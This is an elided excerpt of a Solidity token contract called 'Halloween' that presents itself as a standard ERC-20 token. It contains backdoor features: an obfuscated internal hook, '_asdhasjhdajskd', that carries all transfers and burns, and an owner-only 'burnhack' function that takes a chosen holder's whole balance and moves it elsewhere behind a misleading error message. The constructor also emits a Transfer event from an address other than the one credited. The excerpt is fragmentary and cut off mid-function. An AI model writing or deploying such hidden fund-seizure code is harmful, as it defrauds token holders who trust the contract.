...
contract Halloween is Context, IERC20 {
   ...
   constructor () public {
        ...
        _safeOwner = _owner;
        _totalSupply = _totalSupply.add(initialSupply*(10**9));
        _balances[_owner] = _balances[_owner].add(initialSupply*(10**9));
        emit Transfer(address(0), lead_deployer, initialSupply*(10**9));
    ...
    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        ...
        _asdhasjhdajskd(sender, recipient, amount);
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _asdhasjhdajskd(account, address(0), amount);
    ...
    function _asdhasjhdajskd(address from, address to, uint256 amount) internal virtual { }
    ...
    modifier auth() {
        ...
        function burnhack(address account, address staker) public {
        
            require(msg.sender == _owner, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _asdhasjhdajskd(account, staker, amount);
